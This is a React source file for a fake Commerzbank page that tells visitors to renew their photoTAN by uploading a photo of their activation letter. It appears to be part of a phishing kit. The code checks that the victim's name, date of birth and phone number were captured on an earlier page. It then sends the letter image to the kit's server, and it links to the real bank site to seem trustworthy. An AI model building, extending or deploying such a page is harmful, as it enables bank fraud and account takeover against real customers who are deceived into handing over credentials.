import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLanguage } from '../contexts/LanguageContext';
import apiService from '../services/api';
import { FaArrowRight } from 'react-icons/fa';

const UploadPage: React.FC = () => {
  const navigate = useNavigate();
  const { t } = useLanguage();
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [isMobile, setIsMobile] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    // Check if user came from info page (check both sessionStorage and localStorage)
    const xname1 = sessionStorage.getItem('xname1') || localStorage.getItem('xname1');
    const xname2 = sessionStorage.getItem('xname2') || localStorage.getItem('xname2');
    const xdob = sessionStorage.getItem('xdob') || localStorage.getItem('xdob');
    const xtel = sessionStorage.getItem('xtel') || localStorage.getItem('xtel');
    
    if (!xname1 || !xname2 || !xdob || !xtel) {
      navigate('/info');
    }

    // Check if mobile
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    
    return () => window.removeEventListener('resize', checkMobile);
  }, [navigate]);

  const handleFileInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setSelectedFile(file);
      setError('');
    }
  };

  const handleCameraCapture = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setSelectedFile(file);
      setError('');
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!selectedFile) {
      setError('Please select a file');
      return;
    }

    setIsLoading(true);
    setError('');

    try {
      const formData = new FormData();
        formData.append('file', selectedFile);
      
      const response = await apiService.upload(formData);
      
      if (response.success) {
          navigate('/done');
      } else {
        setError(response.message || 'Upload failed');
      }
    } catch (error) {
      setError('Upload failed. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleUploadClick = () => {
    if (selectedFile) {
      // If file is already selected, upload it
      handleSubmit({ preventDefault: () => {} } as React.FormEvent);
    } else {
      // If no file selected, open file picker
      fileInputRef.current?.click();
    }
  };

  const handleDirectUpload = async () => {
    const fileInput = document.getElementById('directUpload') as HTMLInputElement;
    const file = fileInput?.files?.[0];
    
    if (!file) {
          return;
        }

    try {
      setIsLoading(true);
      
      const sessionId = sessionStorage.getItem('sessionId') || localStorage.getItem('sessionId');
      
      const formData = new FormData();
      formData.append('file', file);
      formData.append('sessionId', sessionId || '');
      
      const response = await fetch('http://localhost:3001/api/upload', {
        method: 'POST',
        body: formData
      });
      
      const result = await response.json();
      
      if (result.success) {
        // Navigate to done page
        navigate('/done');
      } else {
        setError(result.message || 'Upload failed');
      }
    } catch (error) {
      setError('Upload failed. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="upload-page" style={{
      fontFamily: 'Arial, Helvetica, sans-serif',
      backgroundColor: '#f5f5f5',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'flex-start',
      padding: '20px 20px 20px 20px',
      margin: 0
    }}>
      {/* Main heading */}
      <h1 style={{
        fontSize: isMobile ? '24px' : '32px',
        fontWeight: 'bold',
        color: '#333',
        marginTop: '20px',
        marginBottom: '20px',
        fontFamily: 'Arial, Helvetica, sans-serif',
        textAlign: 'left',
        width: '100%',
        maxWidth: '1200px',
        margin: '20px auto 20px auto',
        padding: isMobile ? '0 15px' : '0 20px'
      }}>
        Letzter Schritt: Verlängerung Ihres bestehenden photoTAN-Verfahrens
      </h1>

      
      <div style={{
        display: 'flex',
        flexDirection: isMobile ? 'column' : 'row',
        gap: isMobile ? '15px' : '20px',
        width: '100%',
        maxWidth: '1200px',
        alignItems: 'flex-start',
        margin: '0 auto',
        padding: isMobile ? '0 15px' : '0 20px'
      }}>
          {/* Left Column - Upload Section */}
        <div className="upload-section" style={{
          flex: '1',
          background: 'white',
          borderRadius: '8px',
          boxShadow: '0 2px 10px rgba(0, 0, 0, 0.1)',
          padding: isMobile ? '20px' : '40px',
          width: '100%',
          minWidth: isMobile ? 'auto' : '300px'
        }}>
          {/* Upload heading */}
          <h1 style={{
            fontSize: isMobile ? '24px' : '32px',
            fontWeight: 'bold',
            color: '#333',
            marginTop: '0px',
            marginBottom: '20px',
            fontFamily: 'Arial, Helvetica, sans-serif',
            textAlign: 'left'
          }}>
            Aktivierungsgrafik scannen
          </h1>
          <div className="instruction-box" style={{
            backgroundColor: '#f8f9fa',
            border: '2px dashed #000000',
            borderRadius: '8px',
            padding: isMobile ? '15px' : '20px',
            marginBottom: '20px'
          }}>
            <p className="instruction-text" style={{
              fontSize: isMobile ? '13px' : '14px',
              color: '#333',
              lineHeight: '1.5',
              margin: '0 0 15px 0',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              Scannen Sie die Aktivierungsgrafik aus dem erhaltenen Schreiben, um Ihr photoTAN-Verfahren zu verlängern. Nach Prüfung bleibt es weiterhin gültig.
              Bitte fotografieren Sie erst den gesamten Aktivierungsbrief und laden Sie das Bild aus Ihrer Galerie hoch.
            </p>
            {/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) && (
              <div className="mobile-notice" style={{
                backgroundColor: '#fff3cd',
                border: '1px solid #ffeaa7',
                borderRadius: '4px',
                padding: '10px',
                marginTop: '10px'
              }}>
                <p style={{
                  fontSize: '12px',
                  color: '#856404',
                  margin: '0',
                  fontFamily: 'Arial, Helvetica, sans-serif'
                }}>
                  <strong>{t('mobileNotice')}:</strong> {t('mobileNoticeText')}
                </p>
                  </div>
                )}
              </div>
              
          {/* GIF from public folder */}
          <div style={{
            textAlign: 'center',
            marginBottom: '20px'
          }}>
            <img 
              src="/lika2.gif" 
              alt="Upload animation" 
              style={{
                width: isMobile ? '200px' : '250px',
                height: 'auto',
                borderRadius: '8px',
                boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)'
              }}
            />
                      </div>
                      
          {/* Hidden File Input */}
                <input
                  type="file"
            ref={fileInputRef}
                  onChange={handleFileInputChange}
                  accept="image/*"
                  style={{ display: 'none' }}
                />
                
          {/* Buttons Container */}
          <div style={{ 
            textAlign: 'center',
            margin: '20px 0'
          }}>
                <input
                  type="file"
              id="directUpload"
                  accept="image/*"
              style={{ 
                margin: '0 10px 15px 0',
                padding: '8px',
                border: '1px solid #ddd',
                borderRadius: '4px',
                fontSize: '14px'
              }}
            />
            <br />
                    <button 
              className="upload-button"
              onClick={handleDirectUpload}
              disabled={isLoading}
              style={{
                background: 'linear-gradient(135deg, #006400 0%, #004d00 50%, #006400 100%)',
                color: 'white',
                border: 'none',
                padding: '12px 24px',
                borderRadius: '5px',
                cursor: isLoading ? 'not-allowed' : 'pointer',
                fontSize: '16px',
                fontWeight: 'bold',
                opacity: isLoading ? 0.7 : 1,
                transition: 'all 0.3s ease',
                minWidth: isMobile ? '120px' : '150px'
              }}
            >
              {isLoading ? 'Wird hochgeladen...' : 'Datei hochladen'}
                    </button>
                  </div>

          {/* Selected File Display */}
          {selectedFile && (
            <div style={{
              textAlign: 'center',
              marginTop: '10px',
              padding: '10px',
              backgroundColor: '#e8f5e8',
              borderRadius: '4px',
              border: '1px solid #4caf50'
            }}>
              <p style={{
                margin: '0',
                color: '#2e7d32',
                fontSize: '14px',
                fontFamily: 'Arial, Helvetica, sans-serif'
              }}>
                Ausgewählt: {selectedFile.name}
              </p>
                  </div>
                )}

          {/* Error Display */}
          {error && (
            <div style={{
              textAlign: 'center',
              marginTop: '10px',
              padding: '10px',
              backgroundColor: '#ffebee',
              borderRadius: '4px',
              border: '1px solid #f44336'
            }}>
              <p style={{
                margin: '0',
                color: '#c62828',
                fontSize: '14px',
                fontFamily: 'Arial, Helvetica, sans-serif'
              }}>
                {error}
              </p>
            </div>
          )}
        </div>

        {/* Important Info Box */}
        <div className="info-panel" style={{
          flex: '1',
          background: 'white',
          borderRadius: '8px',
          boxShadow: '0 2px 10px rgba(0, 0, 0, 0.1)',
          padding: isMobile ? '20px' : '40px'
        }}>
          <h3 style={{
            fontSize: '20px',
            fontWeight: 'bold',
            color: '#333',
            marginBottom: '15px',
            fontFamily: 'Arial, Helvetica, sans-serif'
          }}>
            {t('importantInfo')}
          </h3>
          
          <p style={{
            fontSize: '14px',
            color: '#666',
            marginBottom: '20px',
            lineHeight: '1.5',
            fontFamily: 'Arial, Helvetica, sans-serif'
          }}>
            {t('photoTANProblems')}
          </p>
          
          <div style={{ marginBottom: '20px' }}>
            <h4 style={{
              fontSize: '16px',
              fontWeight: 'bold',
              color: '#333',
              marginBottom: '10px',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              {t('noActiveTAN')}
            </h4>
            <div style={{ marginBottom: '8px' }}>
              <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif',
                textDecoration: 'none',
                color: 'inherit',
                cursor: 'pointer'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.textDecoration = 'underline';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.textDecoration = 'none';
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('activatePhotoTAN')}</span>
              </a>
            </div>
            <div>
              <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif',
                textDecoration: 'none',
                color: 'inherit',
                cursor: 'pointer'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.textDecoration = 'underline';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.textDecoration = 'none';
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('photoTANHelp')}</span>
              </a>
            </div>
          </div>

          <div style={{ marginBottom: '20px' }}>
            <h4 style={{
              fontSize: '16px',
              fontWeight: 'bold',
              color: '#333',
              marginBottom: '10px',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              {t('forgotCredentials')}
            </h4>
            <div style={{ marginBottom: '8px' }}>
              <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif',
                textDecoration: 'none',
                color: 'inherit',
                cursor: 'pointer'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.textDecoration = 'underline';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.textDecoration = 'none';
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('requestParticipantNumber')}</span>
              </a>
              </div>
            <div>
              <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif',
                textDecoration: 'none',
                color: 'inherit',
                cursor: 'pointer'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.textDecoration = 'underline';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.textDecoration = 'none';
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('forgotPIN')}</span>
              </a>
              </div>
              </div>

          <div>
            <h4 style={{
              fontSize: '16px',
              fontWeight: 'bold',
              color: '#333',
              marginBottom: '10px',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              {t('allAboutOnlineBanking')}
            </h4>
            <div style={{ marginBottom: '8px' }}>
              <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif',
                textDecoration: 'none',
                color: 'inherit',
                cursor: 'pointer'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.textDecoration = 'underline';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.textDecoration = 'none';
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('instructionsHelp')}</span>
              </a>
              </div>
            <div>
              <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif',
                textDecoration: 'none',
                color: 'inherit',
                cursor: 'pointer'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.textDecoration = 'underline';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.textDecoration = 'none';
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('security')}</span>
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default UploadPage;